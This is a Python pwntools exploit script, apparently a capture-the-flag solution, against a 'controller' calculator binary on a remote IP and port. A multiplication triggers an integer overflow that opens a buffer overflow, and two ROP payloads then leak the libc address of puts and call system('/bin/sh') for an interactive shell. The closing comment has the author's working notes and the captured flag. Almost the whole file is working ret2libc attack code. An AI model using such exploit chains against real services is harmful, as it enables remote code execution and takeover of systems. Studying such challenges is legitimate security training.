from pwn import *

local_bin = "./controller"
elf = ELF(local_bin)
rop = ROP(elf)
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
libc = ELF("./libc.so.6")

#p = gdb.debug(local_bin, '''
	#break *0x400f2c
	#break *calculator+8
	#break *calculator+150
	#continue
	#''')

#p = process(local_bin)

p = remote("165.227.234.7",31054)

def add(arg1, arg2):
	p.sendline(arg1 + b' ' + arg2)
	p.recvuntil(b'operation:')
	p.sendline(b'1')

def divide(arg1, arg2):
	p.sendline(arg1 + b' ' + arg2)
	p.recvuntil(b'operation:')
	p.sendline(b'4')

def multiply(arg1, arg2):
	p.sendline(arg1 + b' ' + arg2)
	p.recvuntil(b'operation:')
	p.sendline(b'3')


POPRDI_gadget = (rop.find_gadget(['pop rdi','ret']))[0]
print("POP_RDI_Gadget = ", hex(POPRDI_gadget))

OFFSET_MAIN_PLT = elf.symbols['main']
print("MAIN_PLT = ", hex(OFFSET_MAIN_PLT))

OFFSET_PUTS_PLT = elf.symbols['puts']
print("PUTS_PLT = ", hex(OFFSET_PUTS_PLT))

OFFSET_PUTS_GOT = elf.got['puts']
print("PUTS_GOT = ", hex(OFFSET_PUTS_GOT))

p.recvuntil(b'recources:')
multiply(b'9', b'-22')

p.recvuntil(b'problem?')
payload = b'A' * 0x10
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget) 
payload += p64(OFFSET_PUTS_GOT)
payload += p64(OFFSET_PUTS_PLT)
payload += p64(POPRDI_gadget+1)
payload += p64(OFFSET_MAIN_PLT)
p.sendline(payload)

print("[+] We leak libc!")
print(p.recvuntil(b'ingored\n'))
leak = p.recvuntil(b'\n')
print("[+] PUTS_GOT leak = ", leak)
print("[+] Calculating libc base")
leak = leak[:-1]
leak_dec = int.from_bytes(leak,"little")
print("[+] leak_dec = ", (leak_dec))
print("[+] Leaked puts = ", hex(leak_dec))
libc_base = leak_dec - libc.sym["puts"]
print("[+] libc_base = ", hex(libc_base))

libc.address = libc_base
BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

print("[+] Calculator restarted")
p.recvuntil(b'recources:')
multiply(b'9', b'-22')

p.recvuntil(b'problem?')
payload = b'A' * 0x10
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget, endian='little')
payload += p64(BINSH)
payload += p64(SYSTEM)
payload += p64(EXIT)

p.sendline(payload)

p.interactive()


'''
9 *-150 = 64186
9 *-1	= 65527
9 * -22 - 65338

0x7fffffffe4b4
0x7fffffffe484
0x7fffffffe454
0x7fffffffe424
0x7fffffffe3f4
0x7fffffffe390
0x7fffffffe390
0x7fffffffe330

if i can reach 65538 i can trigger some other stuff which has buffer overflow

CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}
'''